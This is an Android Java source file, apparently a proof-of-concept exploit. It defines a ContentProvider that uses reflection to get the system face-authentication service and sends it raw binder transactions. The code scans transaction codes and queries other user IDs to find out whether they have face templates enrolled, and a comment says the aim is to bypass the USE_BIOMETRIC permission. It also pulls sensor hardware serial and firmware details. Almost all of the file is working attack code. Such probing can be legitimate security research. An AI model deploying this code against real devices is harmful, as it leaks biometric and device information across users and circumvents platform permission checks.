package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class FaceServiceProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});
        cursor.addRow(new Object[]{"pid", String.valueOf(android.os.Process.myPid())});

        IBinder faceBinder = svc("face");
        if (faceBinder == null) {
            cursor.addRow(new Object[]{"ERROR", "cannot get face service"});
            return cursor;
        }
        String fd = "android.hardware.face.IFaceService";

        // TX=1: generateChallenge? or isHardwareDetected?
        cursor.addRow(new Object[]{"=== TX=1 (unknown) ===", ""});
        cursor.addRow(new Object[]{"tx1", callRawTx(faceBinder, fd, 1, new int[]{0})});

        // TX=2: unknown
        cursor.addRow(new Object[]{"=== TX=2 ===", ""});
        cursor.addRow(new Object[]{"tx2", callRawTx(faceBinder, fd, 2, new int[]{0})});

        // TX=3: getSensorPropertiesInternal — returns hardware info
        cursor.addRow(new Object[]{"=== TX=3 getSensorPropertiesInternal ===", ""});
        cursor.addRow(new Object[]{"tx3_opaque", callRawTx(faceBinder, fd, 3, new int[]{0})});
        // Try to parse the sensor properties
        cursor.addRow(new Object[]{"tx3_parsed", parseSensorProperties(faceBinder, fd)});

        // TX=4: unknown
        cursor.addRow(new Object[]{"=== TX=4 ===", ""});
        cursor.addRow(new Object[]{"tx4", callRawTx(faceBinder, fd, 4, new int[]{0})});

        // TX=8: hasEnrolledTemplates?
        cursor.addRow(new Object[]{"=== TX=8 hasEnrolledTemplates? ===", ""});
        for (int userId : new int[]{0, 11, 99}) {
            cursor.addRow(new Object[]{"tx8_u" + userId, callRawTx(faceBinder, fd, 8, new int[]{1, userId})});
        }

        // TX=9: unknown
        cursor.addRow(new Object[]{"=== TX=9 ===", ""});
        for (int userId : new int[]{0, 11}) {
            cursor.addRow(new Object[]{"tx9_u" + userId, callRawTx(faceBinder, fd, 9, new int[]{1, userId})});
        }

        // TX=10: unknown
        cursor.addRow(new Object[]{"=== TX=10 ===", ""});
        cursor.addRow(new Object[]{"tx10", callRawTx(faceBinder, fd, 10, new int[]{1, 0})});

        // TX=11-15: scan for more
        for (int tx = 11; tx <= 20; tx++) {
            String result = callRawTx(faceBinder, fd, tx, new int[]{1, 0});
            if (result.startsWith("SEC:")) {
                cursor.addRow(new Object[]{"tx" + tx, result.substring(0, Math.min(80, result.length()))});
            } else {
                cursor.addRow(new Object[]{"tx" + tx, result});
            }
        }

        // Also try IFaceService methods that check hasEnrolledBiometrics
        cursor.addRow(new Object[]{"=== hasEnrolledFaces check ===", ""});
        // The proper SDK method FaceManager.hasEnrolledTemplates() requires USE_BIOMETRIC
        // Let's see if the raw binder bypasses it
        for (int userId : new int[]{0, 11, 99}) {
            cursor.addRow(new Object[]{"hasEnrolled_u" + userId,
                callHasEnrolled(faceBinder, fd, userId)});
        }

        return cursor;
    }

    private String parseSensorProperties(IBinder b, String d) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeString(getContext().getOpPackageName());
            b.transact(3, data, reply, 0);
            reply.readException();
            // Read the list
            int listSize = reply.readInt();
            StringBuilder sb = new StringBuilder("listSize=" + listSize);
            if (listSize > 0) {
                // Try to read FaceSensorPropertiesInternal parcelable
                int sensorId = reply.readInt();
                sb.append(" sensorId=").append(sensorId);
                int strength = reply.readInt();
                sb.append(" strength=").append(strength);
                int maxEnroll = reply.readInt();
                sb.append(" maxEnroll=").append(maxEnroll);
                // componentInfo list
                int compCount = reply.readInt();
                sb.append(" components=").append(compCount);
                for (int i = 0; i < compCount && i < 5; i++) {
                    String compId = reply.readString();
                    String hwVer = reply.readString();
                    String fwVer = reply.readString();
                    String serial = reply.readString();
                    String swVer = reply.readString();
                    sb.append(" [").append(compId).append("/").append(hwVer)
                      .append("/").append(fwVer).append("/").append(serial)
                      .append("/").append(swVer).append("]");
                }
                // sensorType
                int sensorType = reply.readInt();
                sb.append(" sensorType=").append(sensorType);
                // supportsFaceDetection
                boolean supportsFD = reply.readInt() != 0;
                sb.append(" supportsFaceDetect=").append(supportsFD);
                // halControlsPreview
                boolean halPreview = reply.readInt() != 0;
                sb.append(" halControlsPreview=").append(halPreview);
                // enrollPreviewAvailable
                int remainingAvail = reply.dataAvail();
                sb.append(" remainingBytes=").append(remainingAvail);
            }
            return sb.toString();
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + e.getClass().getSimpleName() + ":" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callHasEnrolled(IBinder b, String d, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            data.writeInt(1); // sensorId
            data.writeInt(userId);
            data.writeString(getContext().getOpPackageName());
            b.transact(8, data, reply, 0);
            reply.readException();
            int result = reply.readInt();
            return result != 0 ? "HAS_ENROLLED" : "NOT_ENROLLED";
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + e.getClass().getSimpleName() + ":" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String callRawTx(IBinder b, String d, int tx, int[] args) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(d);
            for (int arg : args) {
                data.writeInt(arg);
            }
            b.transact(tx, data, reply, 0);
            reply.readException();
            int avail = reply.dataAvail();
            if (avail == 0) return "OK(empty)";
            // Read first few ints
            StringBuilder sb = new StringBuilder("OK avail=" + avail + " [");
            int count = Math.min(avail / 4, 8);
            for (int i = 0; i < count; i++) {
                if (i > 0) sb.append(",");
                sb.append(reply.readInt());
            }
            sb.append("]");
            return sb.toString();
        } catch (SecurityException e) {
            return "SEC:" + trunc(e.getMessage());
        } catch (Exception e) {
            return "ERR:" + e.getClass().getSimpleName() + ":" + trunc(e.getMessage());
        } finally { data.recycle(); reply.recycle(); }
    }

    private String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder svc(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) { return null; }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
